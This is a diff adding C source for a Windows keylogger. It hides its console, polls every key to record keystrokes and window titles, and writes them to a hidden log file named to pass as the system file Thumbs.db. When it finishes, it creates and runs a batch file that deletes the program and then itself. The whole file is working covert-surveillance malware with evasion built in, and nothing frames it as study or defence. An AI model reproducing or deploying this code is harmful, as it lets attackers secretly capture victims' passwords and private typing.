@@ -1,0 +1,346 @@
+#pragma once
+#include <windows.h>
+#include <stdio.h>
+#include <winuser.h>
+#include <time.h>
+#include <Tchar.h>
+#include <locale.h>
+#include <stdlib.h>
+
+void Start(TCHAR* szOutputFile, int second)
+{
+	HWND hFocus = NULL;
+	HWND hMouseOn = NULL;
+	bool fShiftOn = false;
+	bool fCapitalOn = false;
+	char ShiftMatchTable[32] = { '"', '(', ')', '*', '+', '<', '_', '>', '?', ')', '!', '@', '#', '$', '%', '^', '&', '*', '(', ':', ':', '<', '_', '>', '?', '@' };
+	char buffer[256];
+	time_t s = time(NULL);
+
+	while (1)
+	{
+		HWND hCurrentFocus = GetForegroundWindow();
+		POINT pt = { 0, };
+		GetCursorPos(&pt);
+		HWND hCurrentMouseOn = WindowFromPoint(pt);
+
+		if (second == -1)
+		{
+			s = time(NULL);
+		}
+
+		if (time(NULL) - s > second)
+		{
+			break;
+		}
+
+
+		if ((NULL != hCurrentFocus && NULL == hFocus) ||
+			((hCurrentMouseOn == hCurrentFocus) && (hMouseOn != hCurrentMouseOn)) ||
+			((GetParent(hCurrentMouseOn) == hCurrentFocus) && (hFocus != hCurrentFocus))
+			)
+		{
+			hMouseOn = hCurrentMouseOn;
+			hFocus = hCurrentFocus;
+
+			if (NULL != hFocus)
+			{
+				memset(buffer, 0, 256);
+
+				GetWindowTextA(hFocus, buffer, 256);
+				FILE *file;
+				_wfopen_s(&file, szOutputFile, _T("a+"));
+
+				fputs("\n[", file);
+
+				fputs(buffer, file);
+				fputs("]\n", file);
+
+				fclose(file);
+				SetFileAttributes(szOutputFile, FILE_ATTRIBUTE_HIDDEN);
+			}
+		}
+
+		for (short sCh = 8; sCh <= 222; sCh++)
+		{
+			if (-32767 == GetAsyncKeyState(sCh))
+			{
+				FILE *file;
+				_wfopen_s(&file, szOutputFile, _T("a+"));
+
+				if (NULL != file)
+				{
+					if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
+					{
+						fShiftOn = true;
+					}
+					else
+					{
+						fShiftOn = false;
+					}
+
+					if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
+					{
+						fclose(file);
+						continue;
+					}
+
+
+					//num + special
+					if ((sCh >= 39) && (sCh <= 64))
+					{
+						if (true == fShiftOn)
+						{
+							sCh = ShiftMatchTable[sCh - 39];
+						}
+
+						fputc(sCh, file);
+						fclose(file);
+						break;
+					}
+					//Alpha
+					else if ((sCh > 64) && (sCh < 91))
+					{
+						if (false == fShiftOn && false == fCapitalOn)
+						{
+							sCh += 32;
+						}
+						fputc(sCh, file);
+						fclose(file);
+						break;
+					}
+					else
+					{
+						switch (sCh)
+						{
+						case VK_SPACE:
+							fputc(' ', file);
+							fclose(file);
+							break;
+
+						case VK_SHIFT:
+							//Nothing to do
+							fclose(file);
+							break;
+
+						case VK_RETURN:
+							fputs("\n", file);
+							fclose(file);
+							break;
+						case VK_BACK:
+							fputs("\b", file);
+							fclose(file);
+							break;
+						case VK_TAB:
+							fputs("\t", file);
+							fclose(file);
+							break;
+						case VK_CONTROL:
+							//fputs("[CTRL]",file);
+							fclose(file);
+							break;
+						case VK_DELETE:
+							fputs("[DEL]", file);
+							fclose(file);
+							break;
+						case VK_OEM_1:
+							if (fShiftOn)
+								fputc(':', file);
+							else
+								fputc(';', file);
+							fclose(file);
+							break;
+						case VK_OEM_2:
+							if (fShiftOn)
+								fputc('?', file);
+							else
+								fputc('/', file);
+							fclose(file);
+							break;
+						case VK_OEM_3:
+							if (fShiftOn)
+								fputc('~', file);
+							else
+								fputc('`', file);
+							fclose(file);
+							break;
+						case VK_OEM_4:
+							if (fShiftOn)
+								fputc('{', file);
+							else
+								fputc('[', file);
+							fclose(file);
+							break;
+						case VK_OEM_5:
+							if (fShiftOn)
+								fputc('|', file);
+							else
+								fputc('\\', file);
+							fclose(file);
+							break;
+						case VK_OEM_6:
+							if (fShiftOn)
+								fputc('}', file);
+							else
+								fputc(']', file);
+							fclose(file);
+							break;
+						case VK_OEM_7:
+							if (fShiftOn)
+								fputc('\"', file);
+							else
+								fputc('\'', file);
+							fclose(file);
+							break;
+
+						case VK_OEM_PLUS:
+							if (fShiftOn)
+								fputc('+', file);
+							else
+								fputc('=', file);
+							fclose(file);
+							break;
+						case VK_OEM_COMMA:
+							if (fShiftOn)
+								fputc('<', file);
+							else
+								fputc(',', file);
+							fclose(file);
+							break;
+						case VK_OEM_MINUS:
+							if (fShiftOn)
+								fputc('_', file);
+							else
+								fputc('-', file);
+							fclose(file);
+							break;
+						case VK_OEM_PERIOD:
+							if (fShiftOn)
+								fputc('>', file);
+							else
+								fputc('.', file);
+							fclose(file);
+							break;
+
+						case VK_NUMPAD0:
+							fputc('0', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD1:
+							fputc('1', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD2:
+							fputc('2', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD3:
+							fputc('3', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD4:
+							fputc('4', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD5:
+							fputc('5', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD6:
+							fputc('6', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD7:
+							fputc('7', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD8:
+							fputc('8', file);
+							fclose(file);
+							break;
+						case VK_NUMPAD9:
+							fputc('9', file);
+							fclose(file);
+							break;
+						case VK_CAPITAL:
+							if (false == fCapitalOn)
+							{
+								fCapitalOn = true;
+							}
+							else
+							{
+								fCapitalOn = false;
+							}
+							fclose(file);
+							break;
+						default:
+							fclose(file);
+							break;
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+TCHAR* getfilename()
+{
+	TCHAR szBuffer[MAX_PATH];
+	TCHAR *FirstIdx;
+	TCHAR *pszNextToken = NULL;
+	TCHAR * a;
+
+	GetModuleFileName(NULL, szBuffer, MAX_PATH);
+	FirstIdx = _tcsrchr(szBuffer, '\\');
+	a = _tcstok_s(FirstIdx, _T("\\"), &pszNextToken);
+	return a;
+}
+
+void Killme()
+{
+	FILE *fp = NULL;
+	TCHAR* killer = _T("aa.bat");
+	int Len = _tcslen(getfilename());
+	TCHAR* thisFile = (TCHAR*)malloc(Len);
+	_tcscpy_s(thisFile, Len + 1, getfilename());
+	TCHAR szBatFile[256];
+
+	_wfopen_s(&fp, killer, _T("wt"));
+	if (fp == NULL)
+	{
+		return;
+	}
+	wsprintf(szBatFile,
+		L":Repeat      \r\n"
+		L"del /f /s /q \"%s\"    \r\n"
+		L"if exist \"%s\" goto Repeat \r\n"
+		L"del /s /q %s     \r\n",
+		thisFile, thisFile, killer);
+
+	_wsetlocale(LC_ALL, _T("kor"));
+	fwprintf(fp, szBatFile);
+	fclose(fp);
+	ShellExecute(NULL, _T("open"), killer, NULL, NULL, 0);
+}
+
+int main(int argc, char* argv[])
+{
+	HWND hConsole = GetConsoleWindow();
+
+	SetWindowPos(hConsole, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
+	ShowWindow(hConsole, SW_HIDE);
+
+	if (argc < 3)
+	{
+		Start(_T("Thvmbs.db"), 0);
+	}
+	else
+	{
+		TCHAR szUniCode[256] = { 0, };
+		MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, argv[1], strlen(argv[1]), szUniCode, 256);
+		Start(szUniCode, atoi(argv[2]));
+	}
+	Killme();
+	return 0;
+}
